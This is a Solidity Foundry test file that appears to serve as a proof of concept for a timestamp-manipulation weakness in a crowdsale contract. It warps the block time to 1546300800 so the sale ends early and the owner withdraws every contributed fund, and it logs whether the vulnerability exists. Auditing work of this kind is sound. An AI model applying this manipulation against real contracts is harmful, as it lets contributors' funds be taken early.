// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/timed_crowdsale.sol";

contract TimedCrowdsaleTest is Test {
    TimedCrowdsale crowdsale;
    address owner = makeAddr("owner");
    address user = makeAddr("user");

    function setUp() public {
        vm.startPrank(owner);
        crowdsale = new TimedCrowdsale();
        vm.stopPrank();
        
        // Fund the owner address properly
        vm.deal(owner, 10 ether);
    }

    function testTimeManipulation() public {
        try this.innerTimeManipulation() {
            // If inner test completes without reverting, vulnerability exists
            console2.log("Vulnerability Exists: Miner timestamp manipulation succeeded to finish sale and withdraw early");
        } catch (bytes memory reason) {
            console2.log("Vulnerability not Exist: ", string(reason));
        }
    }

    function innerTimeManipulation() public {
        // Differential state BEFORE-Trigger
        console2.log("--- BEFORE-Trigger ---");
        console2.log("Block timestamp:", block.timestamp);
        console2.log("Sale finished:", crowdsale.isSaleFinished() ? "true" : "false");
        console2.log("Contract balance:", address(crowdsale).balance);
        console2.log("Owner balance:", owner.balance);
        assertFalse(crowdsale.isSaleFinished(), "Sale should not be finished initially");

        // Normal contribution works
        vm.deal(user, 1 ether);
        vm.prank(user);
        crowdsale.contribute{value: 1 ether}();

        // Owner cannot withdraw yet (sale not finished)
        vm.prank(owner);
        vm.expectRevert("Sale not finished yet");
        crowdsale.withdrawFunds();

        // TRIGGER: Simulate miner timestamp manipulation
        console2.log("\n--- TRIGGER: Warp to 1546300800 ---");
        vm.warp(1546300800);

        // Differential state AFTER-Trigger/PRE-Withdrawal
        console2.log("\n--- AFTER-Trigger/PRE-Withdrawal ---");
        console2.log("New block timestamp:", block.timestamp);
        console2.log("Sale finished:", crowdsale.isSaleFinished() ? "true" : "false");
        uint256 contractBalanceBefore = address(crowdsale).balance;
        uint256 ownerBalanceBefore = owner.balance;
        console2.log("Contract balance before withdrawal:", contractBalanceBefore);
        console2.log("Owner balance before withdrawal:", ownerBalanceBefore);
        assertTrue(crowdsale.isSaleFinished(), "Sale should be finished after timestamp manipulation");

        // Confirm and log balance changes
        console2.log("\n--- Balance Verification ---");
        vm.prank(owner);
        crowdsale.withdrawFunds();

        // Differential state AFTER-Withdrawal
        console2.log("\n--- AFTER-Withdrawal ---");
        console2.log("Contract balance:", address(crowdsale).balance);
        console2.log("Owner balance:", owner.balance);
        assertEq(address(crowdsale).balance, 0, "Contract balance should be 0 after withdrawal");
        assertEq(owner.balance, ownerBalanceBefore + contractBalanceBefore, "Owner should receive full contract balance");
    }

    function testPartialTimeManipulation() public {
        // Test with timestamp just before the threshold
        vm.warp(1546300799);
        assertFalse(crowdsale.isSaleFinished());

        // Test with timestamp exactly at threshold
        vm.warp(1546300800);
        assertTrue(crowdsale.isSaleFinished());

        // Test with timestamp just after threshold
        vm.warp(1546300801);
        assertTrue(crowdsale.isSaleFinished());
    }
}